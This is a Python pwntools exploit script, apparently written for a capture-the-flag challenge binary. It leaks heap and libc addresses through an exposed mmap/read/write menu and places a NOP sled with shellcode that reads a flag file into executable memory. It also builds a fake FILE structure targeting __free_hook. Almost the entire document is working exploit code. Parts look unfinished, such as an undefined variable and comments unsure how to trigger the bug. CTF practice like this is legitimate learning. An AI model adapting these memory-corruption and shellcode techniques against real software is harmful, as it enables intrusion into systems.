#!/usr/bin/python3
from pwn import *

"""
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

"""

context.arch = "amd64"


chalELF = ELF("./chall")
libc = ELF("./libc.so.6")

r = False
if r:
    p = remote("challs.xmas.htsp.ro", 2009)
else:
    environ = {"LD_PRELOAD":"./libc.so.6"}
    #environ = {}
    p = process("./chall", env=environ)
    gdb.attach(p, """

    """)


def mmap(addr, sz, prot, flags, fd, offset):
    p.sendline("1")
    p.sendlineafter("=", hex(addr))
    p.sendlineafter("=", hex(sz))
    p.sendlineafter("=", str(prot))
    p.sendlineafter("=", str(flags))
    p.sendlineafter("=", str(fd))
    p.sendlineafter("=", str(offset))
    return addr

def write(data):
    sz = len(data)
    p.sendline("3")
    p.sendlineafter("sz = ", str(sz))
    p.recvuntil("data = ")
    p.write(data)
    #p.recvuntil("Read", timeout=1)

def read(sz, k=False):
    p.sendline("2")
    p.sendlineafter("sz = ", str(sz))
    p.recvuntil("data = ")
    return p.recvuntil("choice")[:-7]


mmap(0, 0x1000, 7, 0x21, -1, 0)
dump = read(0x4000)

off = 0x2000 + 0x1110
heap_base = u64(dump[off : off+8])
log.info(f"heap_base: 0x{heap_base:02x}")



# we can use this to read the dumb internal log
log_mmap = mmap(0x1337000, 0x1000, 3, 1, 3, 0)


win_addr = 0x100000
log.info(f"win_addr @ 0x{win_addr:02x}")
win_page_sz = 0xf00000

mmap(win_addr, win_page_sz, 7, 0x21, -1, 0)


sc = b''
sc += b'\x90'*(win_page_sz-0x100)
# cba to write this lol
sc += asm(pwnlib.shellcraft.open('/home/ctf/flag.txt'))
sc += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_read', 'rax', 'rsp', 0x100))
sc += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_write', 1, 'rsp', 0x100))

sc += asm("""
lol:
    jmp lol
""")
#sc += asm(pwnlib.shellcraft.amd64.s())

write(sc)


file_addr = heap_base + 0x2a0

mmap(heap_base - 0x1000, 0x1000, 7, 0x21, -1, 0)

off = 0x1000 + 0x2a0

dump = read(off + 0x200)
print(hexdump(dump[off:off+0x120]))
a = u64(dump[off+0xd8:off+0xd8+8])
log.info(f"0x{a:02x}")

libc.address = a -0x1ed4a0
log.info(f"libc @ 0x{libc.address:02x}")

data = b''
data += dump[:off] #cyclic(off)


f = FileStructure(null=0xdeed)

elf.fileno = 3

# 
n = 5
fake_file = f.read(addr=libc.symbols['__free_hook'], size=0x3)

print(hex(len(fake_file)))

fake_vtable_addr = heap_base + 0x2a0 + 0xd8 + 8
print(hex(fake_vtable_addr))

data += fake_file


write(data)

# trigger free somehow? lol?
mmap(0, 0, 0, 0, 0, 0)
p.sendline("0")

p.interactive()
